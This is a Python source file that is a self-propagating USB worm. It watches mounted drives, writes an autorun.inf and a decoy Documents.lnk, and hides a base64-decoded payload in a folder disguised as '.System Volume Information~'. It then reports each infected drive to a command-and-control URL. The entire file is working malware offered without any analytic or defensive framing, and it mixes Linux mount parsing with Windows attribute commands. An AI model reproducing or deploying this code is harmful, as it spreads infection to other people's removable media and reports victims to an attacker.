def decode_payload():
    return base64.b64decode(PAYLOAD_B64).decode()

def get_mounted_usb():
    usb_mounts = []
    try:
        with open('/proc/mounts', 'r') as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 2:
                    device, mountpoint = parts[0], parts[1]
                    if any(device.startswith(p) for p in ['/dev/sd', '/dev/disk/by-id/usb']):
                        if mountpoint not in ['/', '/boot', '/home']:
                            usb_mounts.append((device, mountpoint))
                    elif '/media/' in mountpoint or '/mnt/usb' in mountpoint:
                        usb_mounts.append((device, mountpoint))
    except Exception:
        pass
    return usb_mounts

def is_already_infected(mountpoint):
    return os.path.exists(os.path.join(mountpoint, INFECTED_MARKER))

def create_autorun(mountpoint):
    content = (
        "[autorun]\r\n"
        "open=pythonw.exe \".System Volume Information~\\indexer.pyw\"\r\n"
        "label=Removable Disk\r\n"
        "action=Open folder to view files\r\n"
    )
    try:
        path = os.path.join(mountpoint, 'autorun.inf')
        with open(path, 'w') as f:
            f.write(content)
    except Exception:
        pass

def create_hidden_payload(mountpoint):
    hidden_dir = os.path.join(mountpoint, '.System Volume Information~')
    os.makedirs(hidden_dir, exist_ok=True)
    payload_path = os.path.join(hidden_dir, 'indexer.pyw')
    with open(payload_path, 'w') as f:
        f.write(decode_payload())
    subprocess.run(['attrib', '+h', '+s', hidden_dir], capture_output=True)

def create_lnk(mountpoint):
    buf = bytearray(76)
    struct.pack_into('<I', buf, 0, 0x4C)
    buf[4:20] = bytes.fromhex('0114020000000000c000000000000046')
    struct.pack_into('<I', buf, 20, 0x00000008)  # HAS_RELATIVE_PATH
    struct.pack_into('<I', buf, 24, 0x80)  # NORMAL
    struct.pack_into('<I', buf, 60, 1)  # SW_SHOWNORMAL
    path = '.\\Documents'
    encoded = path.encode('utf-16-le')
    buf += struct.pack('<H', len(path))
    buf += encoded
    try:
        lnk_path = os.path.join(mountpoint, 'Documents.lnk')
        with open(lnk_path, 'wb') as f:
            f.write(bytes(buf))
    except Exception:
        pass

def infect_drive(mountpoint):
    create_autorun(mountpoint)
    create_hidden_payload(mountpoint)
    create_lnk(mountpoint)
    # Mark as infected
    try:
        with open(os.path.join(mountpoint, INFECTED_MARKER), 'w') as f:
            f.write('')
    except Exception:
        pass

def report_infection(mountpoint, device):
    if not C2_URL:
        return
    try:
        import urllib.request
        data = json.dumps({
            'type': 'usb_infection',
            'device': device,
            'mountpoint': mountpoint,
            'timestamp': time.time(),
        }).encode()
        req = urllib.request.Request(
            C2_URL + '/usb/infected',
            data=data,
            headers={'Content-Type': 'application/json'},
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

def monitor():
    seen = set()
    while True:
        mounts = get_mounted_usb()
        for device, mountpoint in mounts:
            if mountpoint in seen:
                continue
            seen.add(mountpoint)
            if not is_already_infected(mountpoint):
                infect_drive(mountpoint)
                report_infection(mountpoint, device)
        # Clean up unmounted
        current = {mp for _, mp in mounts}
        seen = seen & current
        time.sleep(POLL_INTERVAL)

if __name__ == '__main__':
    monitor()

